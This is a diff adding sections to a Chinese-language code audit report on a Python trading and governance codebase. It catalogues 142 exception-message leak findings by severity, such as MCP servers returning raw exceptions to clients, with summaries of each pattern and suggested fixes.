+**核心模式总结**：(1)未发现 PEP 8 违规的 None/True/False 比较反模式，代码库中无 `== None`、`!= None`、`== True`、`== False` 的实际代码；`is True`/`is False` 用法均为三态布尔（True/False/None）的正确区分模式；(2)主要反模式为浮点数 `==` 比较作为除法分母守卫（8 个 MEDIUM），集中在统计计算场景（std_dev、pooled_std、older_avg、overall_score），应统一改为 `abs(x) < epsilon`（如 1e-9）；(3)金融场景的浮点累积统计比较需重点关注，`roi_calculator.py` 的 `_total_spent_cost` 经由 `+= cost` 累积，`backtest_engine.py` 的 Sharpe 比率 `std == 0` 守卫位于金融决策路径；(4)哨兵检查模式普遍安全但风格不规范，13 个 LOW 多为时间戳哨兵、零计数哨兵、显式标记值，功能上不会产生 bug；(5)代码库在 `is` 比较整数/字符串、`type(x) ==`、链式比较误用、`not a is b` 等反模式上零缺陷，类型比较规范执行良好。
+
+**严重度汇总**：HIGH=1, MEDIUM=8, LOW=13, 合计=22
+
+---
+
+### 5.168 异常信息泄露（142个，第28轮新增）
+
+#### HIGH（39个）
+
+1. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\_base_server.py:424` — BaseMCPServer 通用异常捕获 `return self._err(req_id, ERR_TOOL_EXECUTION, str(exc))`，任意 MCP tool handler 的原始异常消息直接转发给 JSON-RPC 客户端（可能含文件路径/DB错误/内部模块结构）
+2. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\_base_server.py:424` — 重复实现，同上 str(exc) 直接返回给 MCP 客户端
+3. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\gateway_server.py:568` — MCPGateway 通用异常捕获 `return self._err(req_id, ERR_TOOL_EXECUTION, str(exc))`，聚合所有子 MCP server 工具调用的异常消息直接返回客户端
+4. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\gateway_server.py:568` — 重复实现，同上
+5. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp_server.py:241` — AssetInventory dispatch_tool `return json.dumps({"error": str(exc)})`，资产查询异常消息直接返回 MCP 客户端
+6. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\asset_inventory\mcp_server.py:224` — 重复实现，同上
+7. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:87` — _import_check 返回 `{"error": str(e)}`，ImportError 消息含内部模块路径结构
+8. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:89` — 重复实现，同上
+9. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:591` — _drift_scan ImportError 分支返回 `{"error": f"behavioral-auditor import failed: {e}"}`，含内部模块路径
+10. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:593` — 重复实现，同上
+11. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:593` — _drift_scan 返回 `{"error": f"scan failed: {e}"}`，扫描异常可能含文件系统绝对路径
+12. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:595` — 重复实现，同上
+13. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:616` — _drift_report 返回 `{"error": f"report failed: {e}"}`，报告异常可能含 DB 查询错误
+14. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:618` — 重复实现，同上
+15. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:630` — _drift_budget 返回 `{"error": f"budget check failed: {e}"}`，预算检查异常可能含 DB 错误
+16. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:632` — 重复实现，同上
+17. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:661` — _rbac_check 返回 `{"error": f"RBAC check failed: {e}"}`，权限检查异常可能含内部安全模块结构
+18. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:665` — 重复实现，同上
+19. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:686` — _list_skills 返回 `{"error": f"list_skills failed: {e}"}`，Skill 加载异常含内部模块路径
+20. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:690` — 重复实现，同上
+21. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:706` — _load_skill 返回 `{"error": f"load failed: {e}"}`，同上
+22. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:710` — 重复实现，同上
+23. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:725` — _write_audit 返回 `{"error": f"write_audit failed: {e}"}`，审计写入异常可能含 DB 错误/SQL 语句
+24. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:729` — 重复实现，同上
+25. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:815` — _execute_rollback 返回 `{"error": f"rollback failed: {e}"}`，回滚异常可能含文件路径、DB错误、git内部信息
+26. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:819` — 重复实现，同上
+27. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:835` — _escalate 返回 `{"error": f"escalate failed: {e}"}`，升级引擎异常可能含内部状态
+28. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:839` — 重复实现，同上
+29. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:866` — _check_budget 返回 `{"error": f"check_budget failed: {e}"}`，预算引擎异常可能含 DB 错误
+30. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:870` — 重复实现，同上
+31. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:881` — _escalation_status 返回 `{"error": f"escalation_status failed: {e}"}`
+32. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:885` — 重复实现，同上
+33. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\governance_server.py:902` — _escalation_resolve 返回 `{"error": f"escalation_resolve failed: {e}"}`
+34. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\governance_server.py:906` — 重复实现，同上
+35. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\vector_memory_server.py:189` — VMS _write 返回 `{"error": str(e), "written": False}`，向量记忆写入异常消息直接返回 MCP 客户端
+36. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\vector_memory_server.py:193` — 重复实现，同上
+37. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp\gateway_server.py:565` — MCPGateway 审计日志 `error_message=str(exc)` 记录原始异常（含敏感信息风险，且审计日志可能被其他模块消费）
+38. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\infrastructure\gateway_server.py:567` — 重复实现，同上
+39. **[HIGH]** `d:\ZephyrAlpha\src\zephyr\integration\mcp_server.py:236` — AssetInventory dispatch_tool 通过 EventBusBackpressure.emit 发送 `error_detail=str(exc)` 到事件总线，异常消息可能传播到事件订阅者
+
+#### MEDIUM（66个）
+
+**LLM Gateway SDK 异常含部分 API key（8个）**
+
+1. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\integration\llm_gateway.py:244` — logger.warning 记录 LLM SDK 异常 %s, exc，可能含部分 API key 明文（仅日志，低危）
+2. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\integration\llm_gateway.py:251` — _call_openai_compatible 将 OpenAI SDK 异常存入 `LLMResponse.error=str(exc)`，401错误消息格式为 "Invalid API key: sk-...XXXX" 含部分 API key 明文
+3. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\integration\llm_gateway.py:328` — 同上，_call_anthropic 异常日志
+4. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\integration\llm_gateway.py:335` — _call_anthropic 将 Anthropic SDK 异常存入 LLMResponse.error=str(exc)
+5. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\llm_gateway.py:244` — 重复实现，logger.warning 记录含 API key 的异常
+6. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\llm_gateway.py:251` — 重复实现，LLMResponse.error=str(exc) 存储可能含部分 API key
+7. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\llm_gateway.py:328` — 重复实现
+8. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\autonomy_core\llm_gateway.py:335` — 重复实现
+
+**brain_integration traceback.format_exc() 存入结果对象（8个）**
+
+9. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\brain_integration.py:312` — _l0_startup_probe 将 traceback.format_exc()[-500:] 存入 result.errors，全量 traceback 含代码路径/内部模块结构
+10. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\brain_integration.py:386` — _l1_readiness_probe 同上 traceback 存储
+11. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\brain_integration.py:452` — _l2_liveness_probe 同上
+12. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\brain_integration.py:516` — _l3_reconcile 同上
+13. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\brain_integration.py:229` — 重复实现，traceback.format_exc() 存入 result.errors
+14. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\brain_integration.py:285` — 同上
+15. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\brain_integration.py:338` — 同上
+16. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\brain_integration.py:388` — 同上
+
+**rollback_executor 异常存入 RollbackResult.errors 传播到 MCP 客户端（4个）**
+
+17. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\rollback_executor.py:806` — 全量回滚异常 str(e) 存入 errors 列表和 _write_in_flight 审计记录，RollbackResult.errors 通过 MCP _execute_rollback 传播给客户端
+18. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\rollback_executor.py:812` — details={"error": str(e)} 写入 _write_op_audit 审计记录，含文件路径/DB错误
+19. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\rollback_executor.py:832` — stash_pop 异常 str(e) 写入 in_flight 记录
+20. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\rollback_executor.py:840` — 重复实现，details={"error": str(e)} 传播到 MCP 客户端
+
+**healthcheck/health_monitor 异常消息含路径（5个）**
+
+21. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\health_monitor.py:210` — probe() 返回 ProbeResult(error=str(e))，健康探针异常消息可能含文件路径/模块结构
+22. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\healthcheck_service.py:96` — check_dependencies 返回 HealthStatus(message=f"Import failed: {e}")，ImportError 含内部模块路径
+23. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\healthcheck_service.py:122` — _check_git 返回 HealthStatus(message=str(e))，subprocess 异常含项目路径
+24. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\shared\healthcheck_service.py:167` — _check_disk 返回 HealthStatus(message=str(e))，OSError 含文件系统绝对路径
+25. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\capacity_assurance\tech_stack.py:154` — ComponentStatus(details=str(e)) 含 sqlite3 异常消息
+
+**bootstrap_superadmin 安全模块异常（3个）**
+
+26. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\security\access_control\governance_bridges\bootstrap_superadmin.py:133` — bootstrap() 返回 `{"error": f"import failed: {e}"}`，安全模块 ImportError 含内部路径
+27. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\security\access_control\governance_bridges\bootstrap_superadmin.py:139` — bootstrap() 返回 `{"error": f"bootstrap exception: {e}"}`，superadmin 创建异常可能含安全模块内部信息
+28. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\security\access_control\governance_bridges\bootstrap_superadmin.py:167` — verify() 返回 `{"error": str(e)}`，安全模块验证异常
+
+**rollback_verifier/warm_standby/forward_fix_runner DBHealReport/details（6个）**
+
+29. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\rollback_verifier.py:182` — DBHealReport(details=[str(e)]) 含 DB 恢复错误/SQL 语句
+30. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\rollback_verifier.py:182` — 重复实现，同上
+31. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\warm_standby.py:130` — details=[str(e)] 含热备切换异常
+32. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\warm_standby.py:130` — 重复实现，同上
+33. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\rollback\forward_fix_runner.py:84` — details=[str(e)] 含前向修复异常
+34. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\forward_fix_runner.py:84` — 重复实现，同上
+
+**a2a_saga/git_commit_gateway/reconciliation_registry 异常消息（5个）**
+
+35. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\infrastructure\a2a_protocol\layer3_coordination\a2a_saga.py:118` — result.error_message = str(e) 含 saga 事务异常，可能跨 A2A 协议传播
+36. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\git_commit_gateway.py:356` — CommitResult(message=str(e)) 含 git lock 异常
+37. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\git_commit_gateway.py:741` — 重复实现，同上
+38. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\reconciliation_registry.py:215` — return None, str(e) 含归档异常
+39. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\reconciliation_registry.py:561` — details[doc.name]["archive_error"] = str(e) 含文件归档异常
+
+**kb/verify 与 kb/self_test 异常（9个）**
+
+40. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\verify.py:122` — FactResult(error=str(e)) 含 KB 验证异常
+41. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:190` — CheckResult(str(e)) 含 KB 自检异常
+42. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:239` — 同上
+43. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:272` — 同上
+44. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:299` — 同上
+45. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:323` — 同上
+46. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:346` — 同上
+47. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:380` — 同上
+48. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:420` — 同上
+
+**其他 governance/trading 异常（4个）**
+
+49. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\degradation.py:146` — logger.warning 记录 traceback.format_exc()[:500]，全量 traceback 含代码路径（仅日志）
+50. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\rule_enforcement\sys_master_compliance.py:412` — 返回 detail=str(e) 含合规检查异常
+51. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\orchestrator\memory_writer.py:53` — ArchiveResult(error=str(e)) 含归档异常
+52. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\trading\integration_registry.py:75` — report.details.append({"error": str(e)}) 含集成测试异常
+
+**self_test_verifier 异常 detail=str(e)[:100]（12个）**
+
+53. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:130` — 返回 `{"detail": str(e)[:100]}` 含自检异常
+54. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:174` — 同上
+55. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:224` — 同上
+56. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:323` — 同上
+57. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:370` — 同上
+58. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:402` — 同上
+59. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:91` — 重复实现
+60. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:124` — 同上
+61. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:161` — 同上
+62. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:236` — 同上
+63. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:267` — 同上
+64. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:290` — 同上
+
+**integration_test_runner 异常（2个）**
+
+65. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\integration_test_runner.py:103` — 返回 `{"detail": str(e)}` 含 pip check 异常
+66. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\integration_test_runner.py:78` — 重复实现，同上
+
+#### LOW（37个）
+
+**scripts/governance/repair/p2_pg_concurrent_test.py（12个）**
+
+1. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:106` — return str(e)[:100] 含 PG INSERT 异常
+2. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:110` — return "connect: {str(e)[:100]}"，psycopg2 连接异常含内部主机名/端口/用户名
+3. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:167` — 同上连接异常
+4. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:224` — 同上
+5. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:228` — 同上
+6. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:243` — 同上
+7. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:307` — 同上
+8. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:311` — 同上
+9. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:330` — 同上
+10. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:334` — 同上
+11. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:386` — 同上
+12. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\p2_pg_concurrent_test.py:390` — 同上
+
+**scripts/governance/repair/concurrent_write_test.py（7个）**
+
+13. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:171` — return {"error": str(e)}，sqlite3 异常含文件路径
+14. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:223` — 同上
+15. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:265` — 同上
+16. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:304` — 同上
+17. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:344` — 同上
+18. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:356` — 同上
+19. **[LOW]** `d:\ZephyrAlpha\scripts\governance\repair\concurrent_write_test.py:392` — 同上
+
+**scripts/governance/d5_architecture/check_budget_health.py（8个）**
+
+20. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:46` — return {"detail": str(e)} 含预算引擎异常
+21. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:61` — 同上
+22. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:75` — 同上
+23. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:89` — 同上
+24. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:105` — 同上
+25. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:121` — 同上
+26. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:135` — 同上
+27. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d5_architecture\check_budget_health.py:146` — 同上
+
+**其他 scripts/ CLI 脚本（10个）**
+
+28. **[LOW]** `d:\ZephyrAlpha\scripts\governance\status.py:163` — return {"error": str(e)[:200]} 含脚本崩溃异常
+29. **[LOW]** `d:\ZephyrAlpha\scripts\ops\upgrade_headers_to_14fields.py:538` — UpgradeResult(detail=str(e)) 含文件读写异常
+30. **[LOW]** `d:\ZephyrAlpha\scripts\ops\upgrade_headers_to_14fields.py:630` — 同上
+31. **[LOW]** `d:\ZephyrAlpha\scripts\fix_orphan_all.py:201` — return False, str(e) 含孤儿扫描异常
+32. **[LOW]** `d:\ZephyrAlpha\scripts\governance\iterative_cleanup_imports.py:68` — return False, str(e) 含导入清理异常
+33. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d1_structure\run_script_smoke_test.py:96` — return (False, str(e)) 含脚本冒烟测试异常
+34. **[LOW]** `d:\ZephyrAlpha\scripts\governance\d7_code\detect_forward_reference.py:138` — return [], False, str(e) 含前向引用检测异常
+35. **[LOW]** `d:\ZephyrAlpha\scripts\governance\env_check.py:135` — return (False, str(e)) 含环境检查异常
+36. **[LOW]** `d:\ZephyrAlpha\scripts\quick_profile.py:137` — profile.notes.append(f"job_match_failed: {e}") 含作业匹配异常
+37. **[LOW]** `d:\ZephyrAlpha\scripts\dm90971_add_test_headers.py:260` — return (rel_path, False, str(e)) 含文件写入异常
+
+**核心模式总结**：(1)MCP Server 通用异常处理器是最大泄露面，`_base_server.py:424` 和 `gateway_server.py:568` 的 `except Exception as exc: return self._err(req_id, ERR_TOOL_EXECUTION, str(exc))` 模式作为所有 MCP 工具调用的兜底处理器，将任意异常的原始消息直接转发给 JSON-RPC 客户端，是系统级的信息泄露入口，修复方案应将 `str(exc)` 替换为固定的 "internal error" 消息，详细异常仅记录到日志；(2)GovernanceServer 12 个工具 handler 系统性返回 `{"error": f"... failed: {e}"}`，每个 MCP 工具 handler 在 except 分支都将异常消息嵌入返回字典，形成系统性反模式（两个重复实现共 28 处 HIGH），这些异常可能包含文件系统绝对路径（drift_scan）、DB 错误/SQL 语句（write_audit、check_budget）、git 内部信息（execute_rollback）、内部模块路径（ImportError 分支）；(3)大量重复代码导致问题翻倍，`integration/mcp/` 与 `infrastructure/` 下存在多组近乎完全相同的文件（_base_server.py、governance_server.py、gateway_server.py、vector_memory_server.py、asset_inventory/mcp_server.py），每个反模式都因重复而翻倍，建议统一到单一 SSoT；(4)LLM Gateway 将 SDK 异常存入 LLMResponse.error，OpenAI/Anthropic SDK 的 401 错误消息格式为 "Invalid API key: sk-...XXXX"，含部分 API key 明文，LLMResponse 作为数据对象可能被其他消费者序列化暴露；(5)traceback.format_exc() 存入结果对象（brain_integration.py 2 个重复实现共 8 处），暴露代码路径、内部模块结构、函数调用链。
+
+**严重度汇总**：HIGH=39, MEDIUM=66, LOW=37, 合计=142
 
 ---
 
